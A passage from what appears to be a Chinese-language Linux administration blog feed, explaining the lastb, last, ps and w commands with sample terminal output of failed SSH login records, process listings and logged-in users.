class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">192</span><span class="hljs-selector-tag">-46-210-172</span><span class="hljs-selector-class">.i</span> <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">195.96</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.7</span>     <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">15</span>:<span class="hljs-number">14</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">15</span>:<span class="hljs-number">14</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">18</span>:<span class="hljs-number">12</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">18</span>:<span class="hljs-number">12</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">201.213</span><span class="hljs-selector-class">.185</span><span class="hljs-selector-class">.243</span>. <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">42.194</span><span class="hljs-selector-class">.144</span><span class="hljs-selector-class">.103</span>   <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">00</span>:<span class="hljs-number">07</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">00</span>:<span class="hljs-number">07</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">username</span> <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">183.136</span><span class="hljs-selector-class">.225</span><span class="hljs-selector-class">.14</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">22</span>:<span class="hljs-number">53</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">22</span>:<span class="hljs-number">53</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">scan-19</span><span class="hljs-selector-class">.shadowse</span> <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">15</span>:<span class="hljs-number">54</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">15</span>:<span class="hljs-number">54</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">13</span>:<span class="hljs-number">18</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">13</span>:<span class="hljs-number">18</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-f-filename-读取指定文件记录"><a href="#lastb-f-filename-读取指定文件记录" class="headerlink" title="lastb -f filename 读取指定文件记录"></a>lastb -f filename 读取指定文件记录</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># lastb -f btmp-20220801</span><br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">65</span>.<span class="hljs-number">49</span>.<span class="hljs-number">20</span>.<span class="hljs-number">68</span>      Sat <span class="hljs-keyword">Jul </span><span class="hljs-number">30</span> <span class="hljs-number">09</span>:<span class="hljs-number">47</span> - <span class="hljs-number">09</span>:<span class="hljs-number">47</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-keyword">jvipu </span>   ssh:notty    <span class="hljs-number">45</span>.<span class="hljs-number">33</span>.<span class="hljs-number">65</span>.<span class="hljs-number">249</span>     Fri <span class="hljs-keyword">Jul </span><span class="hljs-number">29</span> <span class="hljs-number">08</span>:<span class="hljs-number">25</span> - <span class="hljs-number">08</span>:<span class="hljs-number">25</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">178</span>.<span class="hljs-number">73</span>.<span class="hljs-number">215</span>.<span class="hljs-number">171</span>   Fri <span class="hljs-keyword">Jul </span><span class="hljs-number">29</span> <span class="hljs-number">06</span>:<span class="hljs-number">11</span> - <span class="hljs-number">06</span>:<span class="hljs-number">11</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">64</span>.<span class="hljs-number">62</span>.<span class="hljs-number">197</span>.<span class="hljs-number">227</span>    Wed <span class="hljs-keyword">Jul </span><span class="hljs-number">27</span> <span class="hljs-number">11</span>:<span class="hljs-number">52</span> - <span class="hljs-number">11</span>:<span class="hljs-number">52</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">64</span>.<span class="hljs-number">62</span>.<span class="hljs-number">197</span>.<span class="hljs-number">227</span>    Tue <span class="hljs-keyword">Jul </span><span class="hljs-number">26</span> <span class="hljs-number">22</span>:<span class="hljs-number">16</span> - <span class="hljs-number">22</span>:<span class="hljs-number">16</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>root     ssh:notty    <span class="hljs-number">39</span>.<span class="hljs-number">174</span>.<span class="hljs-number">65</span>.<span class="hljs-number">227</span>    Tue <span class="hljs-keyword">Jul </span><span class="hljs-number">26</span> <span class="hljs-number">03</span>:<span class="hljs-number">31</span> - <span class="hljs-number">03</span>:<span class="hljs-number">31</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><br><span class="hljs-keyword">btmp-20220801 </span><span class="hljs-keyword">begins </span>Fri <span class="hljs-keyword">Jul </span> <span class="hljs-number">1</span> <span class="hljs-number">03</span>:<span class="hljs-number">55</span>:<span class="hljs-number">47</span> <span class="hljs-number">2022</span><br></code></pre></td></tr></table></figure><h4 id="lastb-n-num-lastb-nnum-显示指定行数"><a href="#lastb-n-num-lastb-nnum-显示指定行数" class="headerlink" title="lastb -n num&#x2F;lastb -nnum 显示指定行数"></a>lastb -n num&#x2F;lastb -nnum 显示指定行数</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># last -n 2</span><br>root     pts/0        218.30.113.53    Thu Aug<span class="hljs-number"> 25 </span>09:31   still logged in<br>root     pts/1        125.33.205.114   Wed Aug<span class="hljs-number"> 24 </span>23:47 - 00:17  (00:30)<br><br>wtmp begins Tue Nov<span class="hljs-number"> 30 </span>15:31:43 2021<br>[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># last -n2</span><br>root     pts/0        218.30.113.53    Thu Aug<span class="hljs-number"> 25 </span>09:31   still logged in<br>root     pts/1        125.33.205.114   Wed Aug<span class="hljs-number"> 24 </span>23:47 - 00:17  (00:30)<br><br>wtmp begins Tue Nov<span class="hljs-number"> 30 </span>15:31:43 2021<br></code></pre></td></tr></table></figure><h4 id="lastb-R-不显示主机名或IP"><a href="#lastb-R-不显示主机名或IP" class="headerlink" title="lastb -R 不显示主机名或IP"></a>lastb -R 不显示主机名或IP</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-R</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-x-显示系统关机，重新开机，以及执行等级的改变等信息"><a href="#lastb-x-显示系统关机，重新开机，以及执行等级的改变等信息" class="headerlink" title="lastb -x 显示系统关机，重新开机，以及执行等级的改变等信息"></a>lastb -x 显示系统关机，重新开机，以及执行等级的改变等信息</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-x</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">192.46</span><span class="hljs-selector-class">.210</span><span class="hljs-selector-class">.172</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">195.96</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.7</span>     <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-username-显示指定用户的记录"><a href="#lastb-username-显示指定用户的记录" class="headerlink" title="lastb username 显示指定用户的记录"></a>lastb username 显示指定用户的记录</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">root</span><br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">201.213</span><span class="hljs-selector-class">.185</span><span class="hljs-selector-class">.243</span>  <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">08</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">08</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">14.204</span><span class="hljs-selector-class">.145</span><span class="hljs-selector-class">.108</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">15</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">06</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-tty-pts-显示指定终端的记录"><a href="#lastb-tty-pts-显示指定终端的记录" class="headerlink" title="lastb tty&#x2F;pts 显示指定终端的记录"></a>lastb tty&#x2F;pts 显示指定终端的记录</h4><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ log]# lastb pts/1<br><span class="hljs-keyword">test     </span>pts/1                         Thu Aug 18 23:11 - 23:11  (00:00)<br><br>btmp begins Mon Aug  1 18:23:34 2022<br></code></pre></td></tr></table></figure><p>tty可以缩写 lastb 0 &#x3D;&#x3D; lastb tty0</p><h4 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h4><p>&#x2F;var&#x2F;log&#x2F;btmp</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">log</span>]# <span class="hljs-keyword">ls</span> -lat /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br>-rw------- 1 root utmp 52224 8月  25 04:36 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>last</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ps</title>
    <link href="/2024/03/15/yunwei/yunweicommands/Linuxcommands/ps/"/>
    <url>/2024/03/15/yunwei/yunweicommands/Linuxcommands/ps/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>用于查看当前进程信息</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ps</span> -ef:基于Unix的选项，可以使用破折号(-)<br><span class="hljs-attribute">UID</span>          PID    PPID  C STIME TTY          TIME CMD<br><span class="hljs-attribute">root</span>           <span class="hljs-number">1</span>       <span class="hljs-number">0</span>  <span class="hljs-number">0</span> Oct27 ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">11</span> /sbin/init<br><br><span class="hljs-attribute">ps</span> aux:基于BSD的选项，不可以使用破折号(-)<br><span class="hljs-attribute">USER</span>         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br><span class="hljs-attribute">root</span>           <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">3</span> <span class="hljs-number">169640</span> <span class="hljs-number">12772</span> ?        Ss   Oct27   <span class="hljs-number">0</span>:<span class="hljs-number">11</span> /sbin/init<br><br></code></pre></td></tr></table></figure><p>备注：<br>ps -aux :打印用户名为x的所有进程，如果x的用户不存在，可能会解释为ps aux</p><p><strong>pa aux 会出现由于命令太长造成被截取的问题</strong></p><p><strong>ps -ef 输出字段解释：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:/proc# ps -ef | grep http | grep -v grep<br><span class="hljs-attribute">root</span>     <span class="hljs-number">3398394</span> <span class="hljs-number">3337140</span>  <span class="hljs-number">0</span> <span class="hljs-number">14</span>:<span class="hljs-number">58</span> pts/<span class="hljs-number">0</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> python -m http.server<br></code></pre></td></tr></table></figure><table><thead><tr><th>UID</th><th>pid</th><th>PPID</th><th>C</th><th>STIME</th><th>TTY</th><th>TIME</th><th>CMD</th></tr></thead><tbody><tr><td>当前进程启动用户ID</td><td>进程ID</td><td>进程父ID</td><td>进程占用CPU百分比</td><td>进程启动时间</td><td>进程运行的终端，如果进程运行和终端没有关系，则显示？，如果显示pts&#x2F;0，则表示由网络连接主机的终端启动运行</td><td>该进程占用CPU的累计时间（[DD-]hh:mm:ss），</td><td>当前进程执行的命令</td></tr><tr><td>root</td><td>3398394</td><td>3337140</td><td>0</td><td>14:58</td><td>pts&#x2F;0</td><td>00:00:00</td><td>当前进程执行的命令</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>ps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>w&amp;who</title>
    <link href="/2024/03/15/yunwei/yunweicommands/Linuxcommands/w&amp;who/"/>
    <url>/2024/03/15/yunwei/yunweicommands/Linuxcommands/w&amp;who/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="w"><a href="#w" class="headerlink" title="w"></a>w</h1><p>显示当前登录系统的用户信息以及当前正在做什么</p><h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/var/log# w<br> <span class="hljs-attribute">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">40</span> up <span class="hljs-number">209</span> days,  <span class="hljs-number">3</span>:<span class="hljs-number">06</span>,  <span class="hljs-number">2</span> users,  load average: <span class="hljs-number">0</span>.<span class="hljs-number">00</span>, <span class="hljs-number">0</span>.<span class="hljs-number">01</span>, <span class="hljs-number">0</span>.<span class="hljs-number">00</span><br><span class="hljs-attribute">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">1</span>:<span class="hljs-number">32</span>   <span class="hljs-number">0</span>.<span class="hljs-number">02</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s pager<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">1</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">13</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s w<br></code></pre></td></tr></table></figure><p> 14:17:40 up 209 days,  3:06,  2 users,  load average: 0.00, 0.01, 0.00</p><p>当前时间  运行时长  当前用户登录个数  当前系统负载 1分钟 5分钟 15分钟</p><p>USER ：登录用户</p><p>TTY：登录方式，pts 远程登录  tty 本地登录</p><p>FROM：登录来源IP</p><p>LOGIN@：登录时间</p><p>IDLE：闲置时间，也就是终端多久没有操作</p><p>JCPU：对应终端所有进程占用CPU时间，不包含过去已经完成的后台任务，但是包含当前正在运行的后台任务（The JCPU time is the time used by all processes attached to the tty.  It does not include past background jobs, but  does  include currently running background jobs.）</p><p>PCPU：对应终端当前进程占用CPU时间</p><p>WHAT：当前登录用户操作</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>w [options] user […]</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="f-不显示登录来源"><a href="#f-不显示登录来源" class="headerlink" title="-f 不显示登录来源"></a>-f 不显示登录来源</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w -f</span><br> <span class="hljs-number">23</span>:<span class="hljs-number">56</span>:<span class="hljs-number">28</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">14</span>:<span class="hljs-number">23</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>        LOGIN@   IDLE   JCPU   PCPU WHAT<br>root     tty1      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">04m</span>  <span class="hljs-number">0.10s</span>  <span class="hljs-number">0.10s</span> -bash<br>root     pts/<span class="hljs-number">0</span>     <span 